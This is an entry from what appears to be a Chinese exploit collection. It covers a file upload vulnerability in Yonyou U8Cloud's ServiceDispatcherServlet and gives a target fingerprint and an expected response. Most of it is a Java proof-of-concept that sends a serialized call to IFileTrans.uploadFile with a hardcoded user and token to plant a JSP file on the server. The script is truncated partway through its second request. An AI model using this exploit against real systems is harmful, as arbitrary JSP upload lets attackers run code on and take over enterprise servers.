# 用友U8CloudServiceDispatcherServlet存在文件上传漏洞

- **系统**：用友　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`title=="U8C"`

**请求体 / payload**
```
PS：需要导入NC源码依赖,感兴趣的师傅自行研究
import nc.bs.framework.common.InvocationInfo;
import nc.bs.framework.comn.NetObjectOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.InetSocketAddress;
import java.net.Proxy;
import java.net.URL;
public class Test {
public static void main(String[] args) {
try {
// 创建连接
Proxy proxy = new Proxy(Proxy.Type.HTTP,
new InetSocketAddress("127.0.0.1", 8080));
// 第一个上传文件请求
URL url = new URL("http://your-ip:8088/ServiceDispatcherServlet");
HttpURLConnection conn = (HttpURLConnection) url.openConnection(proxy);
conn.setRequestMethod("POST");
conn.setDoInput(true);
conn.setDoOutput(true);
conn.setRequestProperty("Content-Type", "application/x-java-serialized-object");
String content = "<%out.println(\"test\");"
+ "new java.io.File(application.getRealPath(request.getServletPath())).delete();%>";
// 要上传的内容
byte[] rawData = content.getBytes("UTF-8");
byte[] fileContent = ZipUtil.compress(rawData);
String path = "test.jsp";
InvocationInfo info = new InvocationInfo(
"",
"nc.itf.hr.tools.IFileTrans",
"uploadFile",
new Class[]{byte[].class, String.class},
new Object[]{fileContent, path}
);
info.setUserCode("root");
info.setToken("199ff19e369ee96a5ab44f3945e8a4ae");
NetObjectOutputStream.writeObject(conn.getOutputStream(), info);
// 第二个移动文件请求
HttpURLConnection conn2 = (HttpURLConnection) url.openConnection(proxy);
conn2.setRequestMethod("POST");
conn2.setDoInput(true);
conn2.setDoOutput(true);
conn2.setRequestProperty("Content-…（脚本共 1929 字，完整版见原文）
```
- **预期**：200　|　—